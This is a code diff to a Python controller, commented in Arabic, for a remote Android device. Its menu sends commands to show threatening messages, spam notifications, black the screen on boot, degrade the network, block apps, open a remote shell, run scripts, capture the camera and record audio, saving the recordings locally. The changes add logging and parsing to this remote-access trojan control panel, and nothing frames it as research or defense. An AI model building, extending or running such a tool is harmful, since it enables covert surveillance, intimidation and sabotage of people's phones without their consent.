@@ -53,6 +53,44 @@ _VIDEO_NAME_RE = re.compile(r"video_(\d+)", re.IGNORECASE)
 
 _PACKAGE_NAME_RE = re.compile(r"^[A-Za-z][A-Za-z0-9_]*(\.[A-Za-z][A-Za-z0-9_]*)+$")
 
+# تسميات العمليات لدورة حياة العملية في أداة التحكم (سطر واحد لكل حالة)
+_OP_LABELS = {
+    "1": "show_threatening",
+    "2": "remove_freefire",
+    "3": "disable_freefire",
+    "4": "spam_notifications",
+    "5": "play_sound",
+    "6": "change_wallpaper",
+    "7": "black_screen_on_boot",
+    "8": "network_degradation",
+    "9": "block_app",
+    "10": "android_shell",
+    "11": "run_script",
+    "12": "device_info",
+    "13": "capture_camera",
+    "14": "record_audio",
+    "15": "block_screen",
+    "16": "play_video",
+    "17": "serious_warning",
+}
+
+# مؤشرات فشل في ردود الجهاز (تصنيف نزيه لنتيجة العملية على الجهاز)
+_FAILURE_MARKERS = ("فشل", "خطأ", "غير صالحة", "INVALID", "NOT FOUND",
+                    "NOT PERMITTED", "DENIED", "مهلة", "unavailable",
+                    "Error", "Failed", "cannot", "رفض")
+
+
+def _lifecycle(label, state):
+    print(f"[LIFECYCLE] {state} {label}")
+
+
+def _op_state_from_result(result):
+    lower = result.lower()
+    for marker in _FAILURE_MARKERS:
+        if marker in result or marker.lower() in lower:
+            return "FAILED"
+    return "COMPLETED"
+
 
 def scan_audio_library():
     """Return a sorted list of [(id, filename)] for audio files inside
@@ -319,6 +357,7 @@ class PhoneController:
                 self._disconnect()
 
     def _disconnect(self):
+        _lifecycle("session", "CLEANUP")
         self.connected = False
         if self.client_socket is not None:
             try:
@@ -361,6 +400,9 @@ class PhoneController:
 
             # معالج اختياري للرد يحوّل البيانات المتلقاة إلى ملف محلي (خيارات 13-14)
             handler = None
+            label = _OP_LABELS.get(choice, choice.strip() or "(empty)")
+            if choice != "18":
+                _lifecycle(label, "START")
 
             try:
                 if choice == "18":
@@ -369,6 +411,7 @@ class PhoneController:
                     break
                 elif choice == "1":
                     if not self._message_dashboard():
+                        _lifecycle(label, "CANCELLED")
                         continue
                 elif choice == "2":
                     self.send_command("remove_freefire")
@@ -380,23 +423,29 @@ class PhoneController:
                     self.send_command(f"spam_notifications:{count}:{message}")
                 elif choice == "5":
                     if not self._play_sound():
+                        _lifecycle(label, "CANCELLED")
                         continue
                 elif choice == "6":
                     if not self._change_wallpaper():
+                        _lifecycle(label, "CANCELLED")
                         continue
                 elif choice == "7":
                     self.send_command("black_screen_on_boot")
                 elif choice == "8":
                     if not self._network_degradation():
+                        _lifecycle(label, "CANCELLED")
                         continue
                 elif choice == "9":
                     if not self._block_app():
+                        _lifecycle(label, "CANCELLED")
                         continue
                 elif choice == "10":
                     self._android_shell()
+                    _lifecycle(label, "CLEANUP")
                     continue
                 elif choice == "11":
                     if not self._run_script():
+                        _lifecycle(label, "CANCELLED")
                         continue
                 elif choice == "12":
                     self.send_command("device_info")
@@ -413,23 +462,29 @@ class PhoneController:
                     handler = self._handle_audio_reply
                 elif choice == "15":
                     if not self._block_screen():
+                        _lifecycle(label, "CANCELLED")
                         continue
                 elif choice == "16":
                     if not self._play_video():
+                        _lifecycle(label, "CANCELLED")
                         continue
                 elif choice == "17":
                     if not self._serious_warning():
+                        _lifecycle(label, "CANCELLED")
                         continue
                 else:
                     print("Invalid choice")
+                    _lifecycle(label, "CANCELLED")
                     continue
 
                 # Receive the result (each command is followed by a single reply in the protocol)
+                _lifecycle(label, "RUNNING")
                 result = receive_message(self.client_socket)
                 if handler is not None:
                     handler(result)
                 else:
                     print(f"Result: {result}")
+                _lifecycle(label, _op_state_from_result(result))
             except (ConnectionError, OSError, EOFError) as e:
                 print(f"Lost connection to device: {e}")
                 break
@@ -616,6 +671,9 @@ class PhoneController:
         if not package:
             print("Result: Error - package name is empty.")
             return False
+        if package.lower().startswith("package:"):
+            # يقبل أيضاً النص كما يظهر في "pm list packages" على الجهاز.
+            package = package[len("package:"):].strip()
         if not _PACKAGE_NAME_RE.match(package):
             print(f"Result: INVALID PACKAGE NAME / PACKAGE NOT FOUND: "
                   f"'{package}' is not a valid Android package name "
@@ -886,7 +944,7 @@ class PhoneController:
             print(f"Result: Error - camera reply from device: {result}")
 
     def _handle_audio_reply(self, result):
-        """Save a record_audio_data:<duration>:<base64> reply as a local 3gp file."""
+        """Save a record_audio_data:<duration>:<base64> reply as a local m4a (AAC) file."""
         if result.startswith("record_audio_data:"):
             rest = result[len("record_audio_data:"):]
             colon = rest.find(":")
@@ -895,7 +953,7 @@ class PhoneController:
                       "(missing duration or data).")
                 return
             b64_data = rest[colon + 1:]
-            self._write_recorded_bytes(b64_data, RECORDINGS_DIR, "recording", ".3gp")
+            self._write_recorded_bytes(b64_data, RECORDINGS_DIR, "recording", ".m4a")
         else:
             print(f"Result: Error - audio reply from device: {result}")
 
